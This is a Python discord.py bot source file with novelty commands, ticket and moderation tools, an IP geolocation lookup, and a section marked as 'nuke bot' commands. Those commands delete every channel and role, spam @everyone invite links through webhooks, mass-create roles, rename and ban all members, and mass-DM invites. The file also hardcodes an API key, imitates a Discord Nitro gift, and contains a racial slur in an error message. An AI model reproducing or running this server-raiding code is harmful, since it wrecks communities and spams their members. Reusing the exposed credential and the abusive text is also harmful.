import discord
from discord.ext import commands
from discord import app_commands
from discord import Color
from discord.ext import tasks
from dotenv import load_dotenv
import os
import random
import asyncio
from discord.ui import View
import psutil
import yt_dlp
import pyfiglet
from collections import deque
import ipaddress
from ipdata import ipdata
import base64
import requests
from PIL import Image
from io import BytesIO
from itertools import cycle
from discord import Game



load_dotenv()

TOKEN = os.getenv('TOKEN')
ipd = ipdata.IPData('bce38bf7131aa8707022cf25b3e823a5e7f58272b3ccaccad318f63e')

intents = discord.Intents.default() #  the intents parameter is crucial for defining what events your bot can listen to and react to
intents.messages = True             # Basically permissions for your bot.
intents.message_content = True
intents.members = True  
intents.guilds = True
intents.guild_messages = True
intents.webhooks = True


bot = commands.Bot(command_prefix='.', intents=intents) # Cmd syntax + intents =intents means to pass the intents to bot/client



@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})') # this is called when the bot has successfully connected to Discord and is ready to operate
    game = discord.Game("yorgamepresence")
    await bot.change_presence(activity=game)

    try:
        GUILD = discord.Object(id=1353756368607383613)
        synced = await bot.tree.sync(guild=GUILD)
        print(f"commands synced.") # Forces the bot to develop within the guild server and to sync everything

    except Exception as e:
        print(f"error syncing commands: {e}") 

    print('------')



# Includes details about the message, channel, guild, and user that triggered the command.
@bot.command()
async def ping(ctx): # CTX Provides information about the command's invocation context
    await ctx.send("Pong!") # Waits for the message to be sent before proceeding
    await ctx.message.delete()

@bot.command()
async def hello(ctx):
    await ctx.send("Hello there!")
    await ctx.message.delete() # Function that sends hello message when u type .hello 

GUILD_ID = discord.Object(id=1353756368607383613) # THIS WILL BE USED TO MAKE SURE OUR TESTING IS ONLY IN OUR SERVER AND NOT GLOBAL

@bot.tree.command(name="8ball", description="Consult 8ball to receive an answer.", guild=GUILD_ID)
@app_commands.describe(question="The question you want answers to.")
async def askQuestion(interaction: discord.Interaction, question: str): # Represents the interaction event, Specifies that users must provide a question, and adds a parameter.
    responses = ["Reply hazy, try again",
                  "signs point to a yes",
                    "yes",
                      "no",
                        "maybe",
                        "no... baka",
                          "yuh fosho",
                            "Sure, Without a doubt",
                              "maybe man idk lol", 
                              "Outlook not so good", 
                              "You'll be the judge", 
                              "Might be possible",
                                "owntext", 
                                "texthere"
                                "texthere"]
    
    answer = random.choice(responses)
    await interaction.response.send_message(f"🎱 **Question:** {question}\n**Answer:** {answer}")

@bot.tree.command(name="gayrate", description="Rates how gay someone is.", guild=GUILD_ID)
@app_commands.describe(user="The user you want to rate, leave empty to rate yourself")
async def gayRate(interaction: discord.Interaction, user: discord.User = None): # it makes the parameter optional as in any1 in server or urself.
    if user is None:
        user = interaction.user
    rating = random.randint(0, 100)
    if rating < 40:
        emoji = "🔥"
    elif rating < 70:
        emoji = "🤑"
    else:
        emoji = "🏳️‍🌈"
    await interaction.response.send_message(f"**{user.name}** is **{rating}%** gay! {emoji}")

@bot.tree.command(name="hotpercentage", description="Rates how hot someone is", guild=GUILD_ID)
@app_commands.describe(user="The user you want to rate, leave empty to rate yourself")
async def hotCalc(interaction: discord.Interaction, user: discord.User = None):
    if user is None:
        user = interaction.user
    rating = random.randint(0, 100)
    if rating < 40:
        emoji = "🤮"
    elif rating < 70:
        emoji = "💗"
    else:
        emoji = "😍"
    await interaction.response.send_message(f"**{user.name}** is **{rating}%** hot {emoji}")

@bot.tree.command(name="coinflip", description="flips a coin", guild=GUILD_ID)
async def coinFlip(interaction: discord.Interaction):
    responses = ["Heads", "Tails"]
    headstails = random.choice(responses)
    await interaction.response.send_message(f"{headstails}")

class View(discord.ui.View):
    @discord.ui.button(label="Claim", style=discord.ButtonStyle.blurple)
    async def button_callback(self, button, interaction):
        await button.response.send_message("urownfunnygifhere6", ephemeral=True)


@bot.tree.command(name="fakenitro", description="Claim a free gift!", guild=GUILD_ID)
async def fakeNitroEmbed(interaction: discord.Interaction):
    hex_color = int("CFD2F5", 16)
    embed = discord.Embed(title="**You've been gifted a subscription!**", description="You've been gifted Nitro for **1 month!**", color=hex_color)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1313160789611380756/1349081838236471356/nitro_logo.jpeg?ex=67d1cdde&is=67d07c5e&hm=fc1be4e4eb3b42a4e6b20322e4b2273265344b17b10e6486a5ac8a4ed3a881e7&=&format=webp&width=436&height=436")
    embed.set_footer(text="Its not real. Or is it ? Find out...")
    await interaction.response.send_message(embed=embed, view=View())

# info about bot wip
@bot.tree.command(name="about", description="About why I created the bot.", guild=GUILD_ID)
async def descriptionAboutBot(interaction: discord.Interaction):
    aboutEmbed = discord.Embed(title="Snipermonkey Special", description="A all in one discord bot which is feature rich and has  everything you'd need on a bot.")
    aboutEmbed.set_thumbnail(url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=233")
    aboutEmbed.add_field(name="Why I created the bot", value="I was bored and wanted to create a bot with multiple purposes.", inline=True)
    aboutEmbed.add_field(name="Code", value="**[Library: discord.py](https://github.com/Rapptz/discord.py)\n Lines: 140**", inline=True)
    aboutEmbed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")

    await interaction.response.send_message(embed=aboutEmbed)

@bot.tree.command(name="pfpstealer", description="Get anyone's PFP", guild=GUILD_ID)
@app_commands.describe(user="The user you want PFP of, leave empty to get your own")
async def pfpStealer(interaction: discord.Interaction, user: discord.User = None):
    if user is None:
        user = interaction.user  # Just means if u dont pick an option itll get ur own PFP
    
    if user.avatar:
        avatar_url = user.avatar.url
        await interaction.response.send_message(avatar_url)
    else:
        await interaction.response.send_message("This user does not have an avatar.")  # If u have discord default pfp this error will come up.

@bot.tree.command(name="bannerstealer", description="Get anyone's banner", guild=GUILD_ID)
@app_commands.describe(user="The user you want banner of, leave empty to get your own")
async def bannerStealer(interaction: discord.Interaction, user: discord.User = None):
    if user is None:
        user = interaction.user

    user = await interaction.client.fetch_user(user.id)

    if user.banner:
        banner_url = user.banner.url
        await interaction.response.send_message(banner_url)
    else:
        await interaction.response.send_message("This user does not have a banner. #NONITRO")





@bot.tree.command(name="textascii", description="Turns your text into ascii", guild=GUILD_ID)
@app_commands.describe(text="The text you want to input.")
async def ascii(interaction: discord.Interaction, text: str):
    ascii_art = pyfiglet.figlet_format(text)
    await interaction.response.send_message(f"```{ascii_art}```")

@bot.tree.command(name="rate", description="Rates what you desire.", guild=GUILD_ID)
@app_commands.describe(thing="The thing you want to rate, leave empty to rate yourself")
async def rateThing(interaction: discord.Interaction, thing: str):
    rating = random.randint(0, 100)
    await interaction.response.send_message(f"I'd rate {thing} a **{rating} / 100**")

@bot.tree.command(name="iplookup", description="Send an IP and it gets the info.", guild=GUILD_ID)
@app_commands.describe(ip="The ip address you want to look up.")
async def ipLookup(interaction: discord.Interaction, ip: str):
    try:
        ip_add = ipaddress.ip_address(ip)
        if isinstance(ip_add, ipaddress.IPv4Address):
            ipInfo = ipd.lookup(ip)
            time_zone_info = ipInfo.get('time_zone', {})
            asn_info = ipInfo.get('asn', {})
            #Formatting the response
            embed = discord.Embed(title=f"**IP Address: {ipInfo.get('ip')}**", color=discord.Color.blue())
            embed.add_field(name="Continent         ", value=ipInfo.get('continent_name'), inline=True)
            embed.add_field(name="Country       ", value=ipInfo.get('country_name'), inline=True)
            embed.add_field(name="Region        ", value=ipInfo.get('region'), inline=True)
            embed.add_field(name="City          ", value=ipInfo.get('city'), inline=True)
            embed.add_field(name="Zip Code           ", value=ipInfo.get('postal'), inline=True)
            embed.add_field(name="Latitude      ", value=ipInfo.get('latitude'), inline=True)
            embed.add_field(name="Longitude     ", value=ipInfo.get('longitude'), inline=True)
            embed.add_field(name="Timezone  ", value=time_zone_info.get('name'), inline=True)
            embed.add_field(name="ISP           ", value=asn_info.get('name'), inline=True)
            embed.add_field(name="Proxy         ", value=ipInfo.get('is_proxy'), inline=True)
            embed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")
            await interaction.response.send_message(embed=embed)
        else:
            await interaction.response.send_message(f"The IP address {ip} is not an IPv4 address.")
    except ValueError:
        await interaction.response.send_message(f"The input {ip} is not a valid IP address you fucking nignog retard")
            
            
@bot.tree.command(name="base64encoder", description="Turns your text into base64", guild=GUILD_ID)
@app_commands.describe(text="The data you want to input.")
async def base64encoder(interaction: discord.Interaction, text: str):
    if isinstance(text, str):
        text_bytes = text.encode('utf-8') # Encode the input text to UTF-8 (Must do)
        encoded_data = base64.b64encode(text_bytes).decode('utf-8') # You need to turn the string into a byte then encode the byte to base64 as base64 cannot encode and decode strings alone.
        await interaction.response.send_message(f"Original text: **{text_bytes}**\n Base64: {encoded_data}")

@bot.tree.command(name="base64decoder", description="Decodes a base64 string.", guild=GUILD_ID)
@app_commands.describe(text="the data you want to decode.")
async def base64decoder(interaction: discord.Interaction, text: str):
    if isinstance(text, str):
        base64string = text
        decoded_data = base64.b64decode(base64string)
        await interaction.response.send_message(f"base64 string: **{base64string}**\n Original Text: {decoded_data}")

@bot.tree.command(name="morsecodetranslator", description="Put a message and it will be in morse code.", guild=GUILD_ID)
@app_commands.describe(message="the message you want to encode.")
async def morseCodeTranslator(interaction: discord.Interaction, message: str):
    MORSE_CODE_DICT = { 
        "A":".-", "B":"-...",
        "C":"-.-.", "D":"-..", "E":".",
        "F":"..-.", "G":"--.", "H":"....",
        "I":"..", "J":".---", "K":"-.-",
        "L":".-..", "M":"--", "N":"-.",
        "O":"---", "P":".--.", "Q":"--.-",
        "R":".-.", "S":"...", "T":"-",
        "U":"..-", "V":"...-", "W":".--",
        "X":"-..-", "Y":"-.--", "Z":"--..",
        "1":".----", "2":"..---", "3":"...--",
        "4":"....-", "5":".....", "6":"-....",
        "7":"--...", "8":"---..", "9":"----.",
        "0":"-----", ", ":"--..--", ".":".-.-.-",
        "?":"..--..", "/":"-..-.", "-":"-....-",
        "(": "-.--.", ")":"-.--.-"
    }

    # Function to encrypt the string
    morse_code = ""
    for letter in message.upper():
        if letter != " ":
            morse_code += MORSE_CODE_DICT[letter] + " "  # Adds a space to separate characters
        else:
            # 1 space indicates different characters
            # and 2 indicates different words
            morse_code += ""

    await interaction.response.send_message(f"Original message: **{message}**\nMorse code: {morse_code}")
    
class CloseButton(discord.ui.View):
    @discord.ui.button(label="🔒 Close", style=discord.ButtonStyle.grey)
    async def closeTicket(self, button: discord.ui.Button, interaction: discord.Interaction):
        channel = button.channel

        await button.response.send_message("Closing the ticket...", ephemeral=True)
        await channel.delete()

class ConfirmButton(discord.ui.View):
    @discord.ui.button(label="Confirm", style=discord.ButtonStyle.grey)
    async def confirmCloseTicket(self, interaction: discord.Interaction, item: discord.ui.Button):
        channel = interaction.channel
        await interaction.response.send_message("Ticket is being closed.")
        await channel.delete()

class ClaimButton(discord.ui.View):
    @discord.ui.button(label=" 🙋‍♂️ Claim", style=discord.ButtonStyle.green)
    async def claimTheTicket(self, interaction: discord.Interaction, item: discord.ui.Button):
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("Bro you cant claim tickets  its for staff.", ephemeral=True)
        else:
            username = interaction.user.name
            embed = discord.Embed(title=f"{username} will be handling your ticket.")
            embed = embed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")
            await interaction.response.send_message(embed=embed)

@bot.tree.command(name="ticket", description="Create a ticket in the server.", guild=GUILD_ID) 
@app_commands.describe(topic="The topic this ticket is about")
@commands.has_permissions(manage_channels=True)
async def create_ticket(interaction: discord.Interaction, topic: str):
    channel_name = f"Ticket-{topic}"
    guild = interaction.guild
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),  # Deny access to everyone
        interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages = True, view_channel = True, attach_files = True, embed_links = True)  # Allow access to the user who created the ticket
    }
    channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
    await interaction.response.send_message(f"Ticket created: {channel.mention}", ephemeral=True)
    embed = discord.Embed(title="Support will be with you shortly.\n To close this ticket click the 🔒")
    embed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")
    await channel.send(f"Welcome to your ticket {interaction.user.mention}!", embed=embed,  view=CloseButton())
    await channel.send(view=ClaimButton())


@bot.tree.command(name="close", description="Closes a ticket you're in. (ADMIN ONLY FORCE CLOSE)", guild=GUILD_ID)
@commands.has_permissions(manage_channels=True)
async def close_ticket(interaction: discord.Interaction):

    channel = interaction.channel
    if 'Ticket' or 'ticket' in channel.name:
        embed = discord.Embed(title="Are you sure you want to close this ticket", color=discord.Color.red())
        await interaction.response.send_message(embed=embed, ephemeral=True, view=ConfirmButton())
    elif not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("Bro you cant force close tickets")
    else:
        await interaction.response.send_message("This is for tickets only")

@bot.tree.command(name="add", description="Adds a user to your ticket.", guild=GUILD_ID)
@app_commands.describe(user="The user you want to add to the ticket.")
async def addToTicket(interaction: discord.Interaction, user: discord.Member = None):
    channel = interaction.channel
    if "ticket" or "Ticket" in channel.name:
        await interaction.channel.set_permissions(user,  read_messages=True, send_messages = True, view_channel = True, attach_files = True, embed_links = True)
        await interaction.response.send_message(f"Added {user} into the ticket.")
    else:
        await interaction.response.send_message("This is for tickets only.")


# 1. Allow it to mention the user who created the ticket
# 2. Create a embed stating the title close request, Pings the author of the command 
# 3. Once this is done, we format the response as the reason input
# 4 ADD A FOOTER THEN ADD THE CLOSE BUTTON OR KEEP OPEN BUTTON


# Add a closrequest command, add a claim button, add 1 extra feature (idk what) once ticket is closed the bot will dm the user with the close reason

@bot.tree.command(name="ban", description="Bans a user from your server", guild=GUILD_ID) 
@app_commands.describe(ban="The user you want to ban.", reason="The reason for the ban.")
@commands.has_permissions(ban_members=True)
async def ban_user(interaction: discord.Interaction, ban: discord.Member, reason: str):
    if interaction.user.id == ban.id:
            await interaction.response.send_message("You cannot ban yourselfr", ephemeral=True)
            return
    elif not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You CANT BAN PPL.", ephemeral=True)
        return

    try:
        await ban.ban(reason=reason)
        ban_embed = discord.Embed(title=f" ✅ **{ban.name}** has been banned for: **{reason}.**", color=discord.Color.green())
        await interaction.response.send_message(embed=ban_embed)

    except discord.Forbidden:
        await interaction.response.send_message("I do not have permission to ban this user", ephemeral=True)

@bot.tree.command(name="kick", description="Kicks a user from your server", guild=GUILD_ID) 
@app_commands.describe(user="The user you want to kick.", reason="The reason for the kick")
@commands.has_permissions(kick_members=True)
async def kick_user(interaction: discord.Interaction, user: discord.Member, reason: str):
    if interaction.user.id == user.id:
            await interaction.response.send_message("You cannot kick yourself ", ephemeral=True)
            return
    
    elif not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You CANT KICK PPL .", ephemeral=True)
        return
    
    try:
        await user.kick(reason=reason)
        kick_embed = discord.Embed(title=f"✅ **{user.name}** has been kicked for: **{reason}**", color=discord.Color.green())
        await interaction.response.send_message(embed=kick_embed)

    except discord.Forbidden:
        await interaction.response.send_message("I do not have permission to kick this user", ephemeral=True)
    
@bot.tree.command(name="purge", description="removes messages from the channel you are in.", guild=GUILD_ID) 
@app_commands.describe(number="The number of messages you want to delete.")
@commands.has_permissions(manage_messages=True)
async def purge_messages(interaction: discord.Interaction, number: int):
    if number < 1 or number > 1000:
        await interaction.response.send_message("Please enter a number between 1 and 1000.", ephemeral=True)
        return
    
    channel = interaction.channel
    deleted_messages = await channel.purge(limit=number)
    await interaction.response.send_message(f"Deleted {len(deleted_messages)} messages.")





    



    
    





    

#NUKE BOT CMDS WIP

@bot.command()
@commands.has_permissions(manage_channels=True)

async def create_channel(ctx):
    await ctx.message.delete()
    webhook_name = "snipermonkeybot"
    channel_name = "snipermonkey_runs_this"
    guild = ctx.guild
    channels = []

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
        except Exception as e:
            print(f'Failed to delete channel {channel.name}: {e}')

    # Create a list of tasks for channel creation
    channel_creation_tasks = []

    

    for i in range(10):
        # Create the channels and store the tasks
        channel_task = guild.create_text_channel(f"{channel_name}_{i + 1}")
        channel_creation_tasks.append(channel_task)

    # Await all channel creations
    channels = await asyncio.gather(*channel_creation_tasks)

    # Create a list of tasks for sending messages
    send_message_tasks = []

    for channel in channels:
        # Create the webhook in each channel
        webhook = await channel.create_webhook(name=webhook_name)
        send_message_task = send_messages(channel, webhook)
        send_message_tasks.append(send_message_task)

    # Await all message sending tasks
    await asyncio.gather(*send_message_tasks)

async def send_messages(channel, webhook):
    for _ in range(10):
        await webhook.send("@everyone Snipermonkey was here! https://discord.gg/QGWffzdT JOIN FOR UPDATES!")
        await asyncio.sleep(0.5)




@bot.command()
@commands.has_permissions(manage_roles=True)
async def mass_roles(ctx):
    roleName = "SnipermonkeyWasHere"

    await ctx.message.delete()
    for i in range(100):

        await ctx.guild.create_role(name=roleName)
        print(f"Created {roleName} for you!") # Will create a shit ton of roles XD
        

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def mass_nicks(ctx):
    nickName = "SnipermonkeyOwnsU"

    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.edit(nick=nickName)
                print(f"Changed nickname for {member.name} to {nickName}")
            except discord.Forbidden:
                print(f"Failed to change nickname. No perms...")
            except Exception as e:
                print(f"Failed to change nickname {nickName}: {e}") # Will try to change all the members usernames based of if they're not the bot or the command author


@bot.command()
@commands.has_permissions(ban_members=True)
async def ban_all(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await ctx.guild.ban(member)
            except discord.Forbidden:
                print(f"Failed to ban user. No perms...") # just bans the entire server

@bot.command()
async def mass_dm(ctx):
    await ctx.message.delete()
    repeat = 1
    DM_message = "Snipermonkey says join this server https://discord.gg/UbcFjGyckT https://media.discordapp.net/attachments/1018817115500847107/1018818163225403402/image0-1.gif?ex=67d5f39a&is=67d4a21a&hm=dbaafc7d7a8e7b4e68bea029fca9fbd391c98f9d2e326f4b75a2df383015be3c&=&width=619&height=474"
    for member in ctx.guild.members:
        if member.bot:
            continue

        if member == ctx.author:
            continue

        for _ in range(repeat):
            try:
                await member.send(DM_message)
                print(f"Successfully DMD {member.name}") 
            except discord.Forbidden:
                await ctx.send(f"Unable to send a DM to {member.mention}. They might have DMs disabled.")
                break  # Break the inner loop if the dm fails so i can go onto next person

@bot.command()
@commands.has_permissions(manage_roles=True)
async def remove_roles(ctx):
    roles = ctx.guild.roles

    for role in roles:
        if role.name != "@everyone": # If the role is not equal to everyone delete the role
            try:
                await role.delete()
            except Exception as e:
                await ctx.send(f"cant") # if it cannot delete the role itll print this out
 



bot.run(TOKEN)